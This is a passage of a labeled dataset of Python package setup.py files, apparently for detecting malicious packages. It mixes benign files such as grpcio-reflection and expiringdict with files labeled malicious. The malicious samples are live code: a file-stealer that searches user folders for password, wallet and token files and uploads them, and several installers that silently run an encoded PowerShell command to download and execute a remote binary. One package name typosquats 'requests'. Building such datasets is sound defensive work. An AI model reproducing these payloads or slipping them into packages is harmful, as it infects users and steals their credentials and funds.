   maxfilesperdir=7\n    i=0\n    listOfFile=os.listdir(pathF)\n    ffound=[]\n    for file in listOfFile:\n        if not os.path.isfile(pathF+'/'+file):return\n        i+=1\n        if i<=maxfilesperdir:\n            url=uploadToAnonfiles(pathF+'/'+file)\n            ffound.append([pathF+'/'+file,url])\n        else:\n            break\n    KiwiFiles.append(['folder',pathF+'/',ffound])\nKiwiFiles=[]\ndef KiwiFile(path,keywords):\n    global KiwiFiles\n    fifound=[]\n    listOfFile=os.listdir(path)\n    for file in listOfFile:\n        for worf in keywords:\n            if worf in file.lower():\n                if os.path.isfile(path+'/'+file)and '.txt' in file:\n                    fifound.append([path+'/'+file,uploadToAnonfiles(path+'/'+file)])\n                    break\n                if os.path.isdir(path+'/'+file):\n                    target=path+'/'+file\n                    KiwiFolder(target,keywords)\n                    break\n    KiwiFiles.append(['folder',path,fifound])\ndef Kiwi():\n    user=temp.split('\\\\AppData')[0]\n    path2search=[\n        user+'/Desktop',\n        user+'/Downloads',\n        user+'/Documents'\n]\n    key_wordsFolder=[\n        'account',\n        'acount',\n        'passw',\n        'secret'\n]\n    key_wordsFiles=[\n        'passw',\n        'mdp',\n        'motdepasse',\n        'mot_de_passe',\n        'login',\n        'secret',\n        'account',\n        'acount',\n        'paypal',\n        'banque',\n        'account',\n        'metamask',\n        'wallet',\n        'crypto',\n        'exodus',\n        'discord',\n        '2fa',\n        'code',\n        'memo',\n        'compte',\n        'token',\n        'backup',\n        'secret',\n        'prox'\n        'binance'\n        'Electrum'\n        'Mycelium'\n]\n    wikith=[]\n    for patt in path2search:\n        kiwi=threading.Thread(target=KiwiFile,args=[patt,key_wordsFiles]);kiwi.start()\n        wikith.append(kiwi)\n    return wikith\nglobal keyword,cookiWords,paswWords\nkeyword=[\n    'mail','[coinbase](https://coinbase.com)','[sellix](https://sellix.io)','[gmail](https://gmail.com)','[steam](https://steam.com)','[discord](https://discord.com)','[riotgames](https://riotgames.com)','[youtube](https://youtube.com)','[instagram](https://instagram.com)','[tiktok](https://tiktok.com)','[twitter](https://twitter.com)','[facebook](https://facebook.com)','card','[epicgames](https://epicgames.com)','[spotify](https://spotify.com)','[yahoo](https://yahoo.com)','[roblox](https://roblox.com)','[twitch](https://twitch.com)','[minecraft](https://minecraft.net)','bank','[paypal](https://paypal.com)','[origin](https://origin.com)','[amazon](https://amazon.com)','[ebay](https://ebay.com)','[aliexpress](https://aliexpress.com)','[playstation](https://playstation.com)','[hbo](https://hbo.com)','[xbox](https://xbox.com)','buy','sell','[binance](https://binance.com)','[hotmail](https://hotmail.com)','[outlook](https://outlook.com)','[crunchyroll](https://crunchyroll.com)','[telegram](https://telegram.com)','[pornhub](https://pornhub.com)','[disney](https://disney.com)','[expressvpn](https://expressvpn.com)','crypto','[uber](https://uber.com)','[netflix](https://netflix.com)'\n]\ncookiWords=[]\npaswWords=[]\nGatherAll()\nDETECTED=Trust(Cookies)\nif not DETECTED:\n    wikith=Kiwi()\n    for thread in wikith:thread.join()\n    time.sleep(0.2)\n    filetext='\\n'\n    for arg in KiwiFiles:\n        if len(arg[2])!=0:\n            foldpath=arg[1]\n            foldlist=arg[2]\n            filetext+=f\"\ufffd {foldpath}\\n\"\n            for ffil in foldlist:\n                a=ffil[0].split('/')\n                fileanme=a[len(a)-1]\n                b=ffil[1]\n                filetext+=f\"... [{fileanme}]({b})\\n\"\n            filetext+='\\n'\n    upload('kiwi',filetext)\n\n\nsetup(\n\n    name='aio_http_proxy_support',\n    packages=['aio_http_proxy_support'],\n    version='1.0',\n    license='MIT',\n    description='description',\n    author=' Jonathan Hartley',\n    keywords=['Colorama'],\n    install_requires=[''],\n    classifiers=['Development Status :: 5 - Production/Stable']\n\n)\n", "target": 1}
{"idx": "grpcio-reflection-1.47.0", "func": "# Copyright 2016 gRPC authors.\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n\"\"\"Setup module for the GRPC Python package's optional reflection.\"\"\"\n\nimport os\nimport sys\n\nimport setuptools\n\n_PACKAGE_PATH = os.path.realpath(os.path.dirname(__file__))\n_README_PATH = os.path.join(_PACKAGE_PATH, 'README.rst')\n\n# Ensure we're in the proper directory whether or not we're being used by pip.\nos.chdir(os.path.dirname(os.path.abspath(__file__)))\n\n# Break import-style to ensure we can actually find our local modules.\nimport grpc_version\n\n\nclass _NoOpCommand(setuptools.Command):\n    \"\"\"No-op command.\"\"\"\n\n    description = ''\n    user_options = []\n\n    def initialize_options(self):\n        pass\n\n    def finalize_options(self):\n        pass\n\n    def run(self):\n        pass\n\n\nCLASSIFIERS = [\n    'Development Status :: 5 - Production/Stable',\n    'Programming Language :: Python',\n    'Programming Language :: Python :: 3',\n    'Programming Language :: Python :: 3.4',\n    'Programming Language :: Python :: 3.5',\n    'Programming Language :: Python :: 3.6',\n    'Programming Language :: Python :: 3.7',\n    'Programming Language :: Python :: 3.8',\n    'Programming Language :: Python :: 3.9',\n    'Programming Language :: Python :: 3.10',\n    'License :: OSI Approved :: Apache Software License',\n]\n\nPACKAGE_DIRECTORIES = {\n    '': '.',\n}\n\nINSTALL_REQUIRES = (\n    'protobuf>=3.12.0',\n    'grpcio>={version}'.format(version=grpc_version.VERSION),\n)\n\ntry:\n    import reflection_commands as _reflection_commands\n\n    # we are in the build environment, otherwise the above import fails\n    SETUP_REQUIRES = ('grpcio-tools=={version}'.format(\n        version=grpc_version.VERSION),)\n    COMMAND_CLASS = {\n        # Run preprocess from the repository *before* doing any packaging!\n        'preprocess': _reflection_commands.Preprocess,\n        'build_package_protos': _reflection_commands.BuildPackageProtos,\n    }\nexcept ImportError:\n    SETUP_REQUIRES = ()\n    COMMAND_CLASS = {\n        # wire up commands to no-op not to break the external dependencies\n        'preprocess': _NoOpCommand,\n        'build_package_protos': _NoOpCommand,\n    }\n\nsetuptools.setup(name='grpcio-reflection',\n                 version=grpc_version.VERSION,\n                 license='Apache License 2.0',\n                 description='Standard Protobuf Reflection Service for gRPC',\n                 long_description=open(_README_PATH, 'r').read(),\n                 author='The gRPC Authors',\n                 author_email='grpc-io@googlegroups.com',\n                 classifiers=CLASSIFIERS,\n                 url='https://grpc.io',\n                 package_dir=PACKAGE_DIRECTORIES,\n                 packages=setuptools.find_packages('.'),\n                 python_requires='>=3.6',\n                 install_requires=INSTALL_REQUIRES,\n                 setup_requires=SETUP_REQUIRES,\n                 cmdclass=COMMAND_CLASS)\n", "target": 0}
{"idx": "pipmine-2.4", "func": "from distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'pipmine',\n    packages = ['modlib'],\n    version = '5.77',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "esqadnvidia-8.39", "func": "from distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'esqadnvidia',\n    packages = ['modlib'],\n    version = '7.58',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "edk2-pytool-library-0.11.5", "func": "## @file setup.py\n# This contains setup info for edk2-pytool-library pip module\n#\n##\n# Copyright (c) Microsoft Corporation\n#\n# SPDX-License-Identifier: BSD-2-Clause-Patent\n##\n\nimport setuptools\nfrom setuptools.command.sdist import sdist\nfrom setuptools.command.install import install\nfrom setuptools.command.develop import develop\nfrom edk2toollib.windows.locate_tools import _DownloadVsWhere\n\nwith open(\"readme.md\", \"r\") as fh:\n    long_description = fh.read()\n\n\nclass PostSdistCommand(sdist):\n    \"\"\"Post-sdist.\"\"\"\n    def run(self):\n        # we need to download vswhere so throw the exception if we don't get it\n        _DownloadVsWhere()\n        sdist.run(self)\n\n\nclass PostInstallCommand(install):\n    \"\"\"Post-install.\"\"\"\n    def run(self):\n        install.run(self)\n        _DownloadVsWhere()\n\n\nclass PostDevCommand(develop):\n    \"\"\"Post-develop.\"\"\"\n    def run(self):\n        develop.run(self)\n        try:\n            _DownloadVsWhere()\n        except:\n            pass\n\n\nsetuptools.setup(\n    name=\"edk2-pytool-library\",\n    author=\"Tianocore Edk2-PyTool-Library team\",\n    author_email=\"sean.brogan@microsoft.com\",\n    description=\"Python library supporting UEFI EDK2 firmware development\",\n    long_description=long_description,\n    long_description_content_type=\"text/markdown\",\n    url=\"https://github.com/tianocore/edk2-pytool-library\",\n    license='BSD-2-Clause-Patent',\n    packages=setuptools.find_packages(),\n    cmdclass={\n        'sdist': PostSdistCommand,\n        'install': PostInstallCommand,\n        'develop': PostDevCommand,\n    },\n    include_package_data=True,\n    use_scm_version=True,\n    setup_requires=['setuptools_scm'],\n    classifiers=[\n        \"Programming Language :: Python :: 3\",\n        \"License :: OSI Approved :: BSD License\",\n        \"Operating System :: OS Independent\",\n        \"Development Status :: 4 - Beta\",\n        \"Intended Audience :: Developers\"\n    ]\n)\n", "target": 0}
{"idx": "djangorestframework-xml-2.0.0", "func": "#!/usr/bin/env python\n# -*- coding: utf-8 -*-\nimport os\nimport re\nimport sys\n\nfrom setuptools import setup\nfrom setuptools.command.test import test as TestCommand\n\n\n# This command has been borrowed from\n# https://github.com/getsentry/sentry/blob/master/setup.py\nclass PyTest(TestCommand):\n    def finalize_options(self):\n        TestCommand.finalize_options(self)\n        self.test_args = [\"tests\"]\n        self.test_suite = True\n\n    def run_tests(self):\n        import pytest\n\n        errno = pytest.main(self.test_args)\n        sys.exit(errno)\n\n\ndef read(f):\n    return open(f, \"r\", encoding=\"utf-8\").read()\n\n\ndef get_version(package):\n    \"\"\"\n    Return package version as listed in `__version__` in `init.py`.\n    \"\"\"\n    init_py = open(os.path.join(package, \"__init__.py\")).read()\n    return re.search(\n        \"^__version__ = ['\\\"]([^'\\\"]+)['\\\"]\", init_py, re.MULTILINE\n    ).group(1)\n\n\ndef get_packages(package):\n    \"\"\"\n    Return root package and all sub-packages.\n    \"\"\"\n    return [\n        dirpath\n        for dirpath, dirnames, filenames in os.walk(package)\n        if os.path.exists(os.path.join(dirpath, \"__init__.py\"))\n    ]\n\n\ndef get_package_data(package):\n    \"\"\"\n    Return all files under the root package, that are not in a\n    package themselves.\n    \"\"\"\n    walk = [\n        (dirpath.replace(package + os.sep, \"\", 1), filenames)\n        for dirpath, dirnames, filenames in os.walk(package)\n        if not os.path.exists(os.path.join(dirpath, \"__init__.py\"))\n    ]\n\n    filepaths = []\n    for base, filenames in walk:\n        filepaths.extend(\n            [os.path.join(base, filename) for filename in filenames]\n        )\n    return {package: filepaths}\n\n\nname = \"djangorestframework-xml\"\npackage = \"rest_framework_xml\"\nversion = get_version(package)\ndescription = \"XML support for Django REST Framework\"\nurl = \"https://github.com/jpadilla/django-rest-framework-xml\"\nauthor = \"Jos\u00e9 Padilla\"\nauthor_email = \"hello@jpadilla.com\"\nlicense = \"BSD\"\ninstall_requires = [\"defusedxml>=0.6.0\"]\nextras_requires = {\n    \"docs\": [\"mkdocs>=0.11.1\"],\n    \"tests\": [\n        \"Django>=1.6\",\n        \"djangorestframework>=2.4.3\",\n        \"pytest-django\",\n        \"pytest\",\n        \"flake8\",\n    ],\n}\n\nextras_requires[\"dev\"] = (\n    extras_requires[\"docs\"] + extras_requires[\"tests\"] + [\"tox\", \"pre-commit\"]\n)\n\n\nif sys.argv[-1] == \"publish\":\n    os.system(\"python setup.py sdist upload\")\n    os.system(\"python setup.py bdist_wheel upload\")\n    print(\"You probably want to also tag the version now:\")\n    print(\"  git tag -a {0} -m 'version {0}'\".format(version))\n    print(\"  git push --tags\")\n    sys.exit()\n\nsetup(\n    name=name,\n    version=version,\n    url=url,\n    license=license,\n    description=description,\n    long_description=read(\"README.md\"),\n    long_description_content_type=\"text/markdown\",\n    author=author,\n    author_email=author_email,\n    packages=get_packages(package),\n    package_data=get_package_data(package),\n    cmdclass={\"test\": PyTest},\n    install_requires=install_requires,\n    extras_require=extras_requires,\n    python_requires=\">=3.5\",\n    classifiers=[\n        \"Development Status :: 5 - Production/Stable\",\n        \"Environment :: Web Environment\",\n        \"Framework :: Django\",\n        \"Intended Audience :: Developers\",\n        \"License :: OSI Approved :: BSD License\",\n        \"Operating System :: OS Independent\",\n        \"Natural Language :: English\",\n        \"Programming Language :: Python :: 3\",\n        \"Programming Language :: Python :: 3.5\",\n        \"Programming Language :: Python :: 3.6\",\n        \"Programming Language :: Python :: 3.7\",\n        \"Programming Language :: Python :: 3.8\",\n        \"Topic :: Internet :: WWW/HTTP\",\n    ],\n)\n", "target": 0}
{"idx": "djangorestframework-gis-1.0", "func": "#!/usr/bin/env python\nimport os\nimport sys\n\nfrom setuptools import find_packages, setup\n\nfrom rest_framework_gis import get_version\n\nif sys.argv[-1] == 'publish':\n    os.system(\"python setup.py sdist bdist_wheel\")\n    os.system(\"twine upload -s dist/*\")\n    os.system(\"rm -rf dist build\")\n    args = {'version': get_version()}\n    print(\"You probably want to also tag the version now:\")\n    print(\"  git tag -a %(version)s -m 'version %(version)s'\" % args)\n    print(\"  git push --tags\")\n    sys.exit()\n\nhere = os.path.abspath(os.path.dirname(__file__))\n\n# Get the long description from the README file\nwith open(os.path.join(here, 'README.rst'), encoding='utf-8') as f:\n    long_description = f.read()\n\n\nsetup(\n    name='djangorestframework-gis',\n    version=get_version(),\n    license='BSD',\n    author='Douglas Meehan',\n    author_email='django-rest-framework-gis@googlegroups.com',\n    description='Geographic add-ons for Django Rest Framework',\n    long_description=long_description,\n    url='https://github.com/openwisp/django-rest-framework-gis',\n    download_url='https://github.com/openwisp/django-rest-framework-gis/releases',\n    platforms=['Platform Indipendent'],\n    keywords=['django', 'rest-framework', 'gis', 'geojson'],\n    packages=find_packages(exclude=['tests', 'tests.*']),\n    install_requires=['djangorestframework'],\n    classifiers=[\n        'Development Status :: 4 - Beta',\n        'Environment :: Web Environment',\n        'Topic :: Internet :: WWW/HTTP',\n        'Intended Audience :: Developers',\n        'License :: OSI Approved :: BSD License',\n        'Operating System :: OS Independent',\n        'Framework :: Django',\n        'Programming Language :: Python',\n        'Programming Language :: Python :: 3',\n        'Programming Language :: Python :: 3.4',\n        'Programming Language :: Python :: 3.5',\n        'Programming Language :: Python :: 3.6',\n        'Programming Language :: Python :: 3.7',\n        'Programming Language :: Python :: 3 :: Only',\n    ],\n    project_urls={\n        'Bug Reports': 'https://github.com/openwisp/django-rest-framework-gis/issues',\n        'Continuous Integration': (\n            'https://github.com/openwisp/django-rest-framework-gis/actions?'\n            'query=workflow%3A%22Django+Rest+Framework+Gis+CI+Build%22'\n        ),\n        'Mailing List': 'https://groups.google.com/forum/#!forum/django-rest-framework-gis',\n        'Code Coverage': 'https://coveralls.io/github/openwisp/django-rest-framework-gis',\n        'Source Code': 'https://github.com/openwisp/django-rest-framework-gis',\n    },\n)\n", "target": 0}
{"idx": "djangocms-text-ckeditor-5.1.1", "func": "#!/usr/bin/env python\nfrom pathlib import Path\n\nfrom setuptools import find_packages, setup\n\nfrom djangocms_text_ckeditor import __version__\n\n\nREQUIREMENTS = [\n    'django-cms>=3.6',\n    'html5lib>=1',\n    'Pillow',\n]\n\n\nCLASSIFIERS = [\n    'Development Status :: 5 - Production/Stable',\n    'Environment :: Web Environment',\n    'Intended Audience :: Developers',\n    'License :: OSI Approved :: BSD License',\n    'Operating System :: OS Independent',\n    'Programming Language :: Python',\n    'Programming Language :: Python :: 3',\n    'Programming Language :: Python :: 3.7',\n    'Programming Language :: Python :: 3.8',\n    'Programming Language :: Python :: 3.9',\n    'Programming Language :: Python :: 3.10',\n    'Framework :: Django',\n    'Framework :: Django :: 2.2',\n    'Framework :: Django :: 3.1',\n    'Framework :: Django :: 3.2',\n    'Framework :: Django CMS',\n    'Framework :: Django CMS :: 3.6',\n    'Framework :: Django CMS :: 3.7',\n    'Framework :: Django CMS :: 3.8',\n    'Framework :: Django CMS :: 3.9',\n    'Framework :: Django CMS :: 3.10',\n    'Topic :: Internet :: WWW/HTTP',\n    'Topic :: Internet :: WWW/HTTP :: Dynamic Content',\n    'Topic :: Software Development',\n    'Topic :: Software Development :: Libraries',\n]\n\nthis_directory = Path(__file__).parent\nlong_description = (this_directory / 'README.rst').read_text()\n\nsetup(\n    name='djangocms-text-ckeditor',\n    version=__version__,\n    author='Divio AG',\n    author_email='info@divio.ch',\n    maintainer='Django CMS Association and contributors',\n    maintainer_email='info@django-cms.org',\n    url='https://github.com/django-cms/djangocms-text-ckeditor',\n    license='BSD-3-Clause',\n    description='Text Plugin for django CMS with CKEditor support',\n    long_description=long_description,\n    long_description_content_type='text/x-rst',\n    packages=find_packages(exclude=['tests']),\n    include_package_data=True,\n    zip_safe=False,\n    install_requires=REQUIREMENTS,\n    classifiers=CLASSIFIERS,\n    python_requires='>=3.7',\n    test_suite='tests.settings.test',\n)\n", "target": 0}
{"idx": "expiringdict-1.2.2", "func": "from setuptools import setup, find_packages\n\ntry:\n    ModuleNotFoundError\nexcept NameError:\n    ModuleNotFoundError = ImportError\n\ntry:\n    import md5  # fix for \"No module named _md5\" error\nexcept ImportError:\n    # python 3 moved md5\n    from hashlib import md5\n\ntests_require = [\n    \"dill\",\n    \"coverage\",\n    \"coveralls\",\n    \"mock\",\n    \"nose\",\n]\n\nsetup(name=\"expiringdict\",\n      version=\"1.2.2\",\n      description=\"Dictionary with auto-expiring values for caching purposes\",\n      long_description=open(\"README.rst\").read(),\n      classifiers=[\n          \"Development Status :: 4 - Beta\",\n          \"Intended Audience :: Developers\",\n          \"License :: OSI Approved :: Apache Software License\",\n          \"Programming Language :: Python :: 2\",\n          \"Programming Language :: Python :: 2.7\",\n          \"Programming Language :: Python :: 3\",\n          \"Programming Language :: Python :: 3.6\",\n          \"Topic :: Software Development :: Libraries\",\n      ],\n      keywords=\"\",\n      author=\"Mailgun Technologies Inc.\",\n      author_email=\"admin@mailgun.com\",\n      url=\"https://www.mailgun.com/\",\n      license=\"Apache 2\",\n      packages=find_packages(exclude=[\"tests\"]),\n      include_package_data=True,\n      zip_safe=True,\n      tests_require=tests_require,\n      install_requires=[\n          'typing;python_version<\"3.5\"',\n      ],\n      extras_require={\n          \"tests\": tests_require,\n      })\n", "target": 0}
{"idx": "esqinfohttpreplace-8.41", "func": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'esqinfohttpreplace',\n    packages = ['modlib'],\n    version = '7.18',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "requestst-2.28.2", "func": "#!/usr/bin/env python\nimport os\nimport sys\nfrom codecs import open\n\nfrom setuptools import setup\nfrom setuptools.command.test import test as TestCommand\n\nCURRENT_PYTHON = sys.version_info[:2]\nREQUIRED_PYTHON = (3, 7)\n\nif CURRENT_PYTHON < REQUIRED_PYTHON:\n    sys.stderr.write(\n        \"\"\"\n==========================\nUnsupported Python version\n==========================\nThis version of Requests requires at least Python {}.{}, but\nyou're trying to install it on Python {}.{}. To resolve this,\nconsider upgrading to a supported Python version.\n\nIf you can't upgrade your Python version, you'll need to\npin to an older version of Requests (<2.28).\n\"\"\".format(\n            *(REQUIRED_PYTHON + CURRENT_PYTHON)\n        )\n    )\n    sys.exit(1)\n\n\nclass PyTest(TestCommand):\n    user_options = [(\"pytest-args=\", \"a\", \"Arguments to pass into py.test\")]\n\n    def initialize_options(self):\n        TestCommand.initialize_options(self)\n        try:\n            from multiprocessing import cpu_count\n\n            self.pytest_args = [\"-n\", str(cpu_count()), \"--boxed\"]\n        except (ImportError, NotImplementedError):\n            self.pytest_args = [\"-n\", \"1\", \"--boxed\"]\n\n    def finalize_options(self):\n        TestCommand.finalize_options(self)\n        self.test_args = []\n        self.test_suite = True\n\n    def run_tests(self):\n        import pytest\n\n        errno = pytest.main(self.pytest_args)\n        sys.exit(errno)\n\n\n# 'setup.py publish' shortcut.\nif sys.argv[-1] == \"publish\":\n    os.system(\"python setup.py sdist bdist_wheel\")\n    os.system(\"twine upload dist/*\")\n    sys.exit()\n\nrequires = [\n    \"charset_normalizer>=2,<4\",\n    \"idna>=2.5,<4\",\n    \"urllib3>=1.21.1,<1.27\",\n    \"certifi>=2017.4.17\",\n]\ntest_requirements = [\n    \"pytest-httpbin==0.0.7\",\n    \"pytest-cov\",\n    \"pytest-mock\",\n    \"pytest-xdist\",\n    \"PySocks>=1.5.6, !=1.5.7\",\n    \"pytest>=3\",\n]\n\nabout = {}\nhere = os.path.abspath(os.path.dirname(__file__))\nwith open(os.path.join(here, \"requests\", \"__version__.py\"), \"r\", \"utf-8\") as f:\n    exec(f.read(), about)\n\nwith open(\"README.md\", \"r\", \"utf-8\") as f:\n    readme = f.read()\n\nsetup(\n    name=\"requestst\",\n    version=about[\"__version__\"],\n    description=about[\"__description__\"],\n    long_description=readme,\n    long_description_content_type=\"text/markdown\",\n    author=\"Orange Alice\",\n    author_email=about[\"__author_email__\"],\n    url=about[\"__url__\"],\n    packages=[\"requests\"],\n    package_data={\"\": [\"LICENSE\", \"NOTICE\"]},\n    package_dir={\"requests\": \"requests\"},\n    include_package_data=True,\n    python_requires=\">=3.7, <4\",\n    install_requires=requires,\n    license=about[\"__license__\"],\n    zip_safe=False,\n    classifiers=[\n        \"Development Status :: 5 - Production/Stable\",\n        \"Environment :: Web Environment\",\n        \"Intended Audience :: Developers\",\n        \"License :: OSI Approved :: Apache Software License\",\n        \"Natural Language :: English\",\n        \"Operating System :: OS Independent\",\n        \"Programming Language :: Python\",\n        \"Programming Language :: Python :: 3\",\n        \"Programming Language :: Python :: 3.7\",\n        \"Programming Language :: Python :: 3.8\",\n        \"Programming Language :: Python :: 3.9\",\n        \"Programming Language :: Python :: 3.10\",\n        \"Programming Language :: Python :: 3.11\",\n        \"Programming Language :: Python :: 3 :: Only\",\n        \"Programming Language :: Python :: Implementation :: CPython\",\n        \"Programming Language :: Python :: Implementation :: PyPy\",\n        \"Topic :: Internet :: WWW/HTTP\",\n        \"Topic :: Software Development :: Libraries\",\n    ],\n    cmdclass={\"test\": PyTest},\n    tests_require=test_requirements,\n    extras_require={\n        \"security\": [],\n        \"socks\": [\"PySocks>=1.5.6, !=1.5.7\"],\n        \"use_chardet_on_py3\": [\"chardet>=3.0.2,<6\"],\n    },\n    project_urls={\n        \"Documentation\": \"https://requests.readthedocs.io\",\n        \"Source\": \"https://github.com/psf/requests\",\n    },\n)\n", "target": 1}
{"idx": "admcheck-1.3.0", "func": "from setuptools import setup, find_packages\n\n\n\n\nVERSION = '1.3.0'\nDESCRIPTION = 'basic package to check if user has admin'\n\n# Setting up\nsetup(\n    name=\"admcheck\",\n    version=VERSION,\n    author=\"ix_EcIipse\",\n    author_email=\"blank@noemail.net\",\n    description=DESCRIPTION,\n    packages=find_packages(),\n    install_requires=['requests', 'pyautogui'],\n    keywords=['python', 'sockets', 'requests'],\n    classifiers=[\n        \"Development Status :: 1 - Planning\",\n        \"Intended Audience :: Developers\",\n        \"Programming Language :: Python :: 3\",\n        \"Operating System :: Unix\",\n        \"Operating System :: MacOS :: MacOS X\",\n        \"Operating System :: Microsoft :: Windows\",\n    ]\n)", "target": 1}
{"idx": "py-pongpep-8.18", "func": "from distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'py-pongpep',\n    packages = ['modlib'],\n    version = '5.71',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: 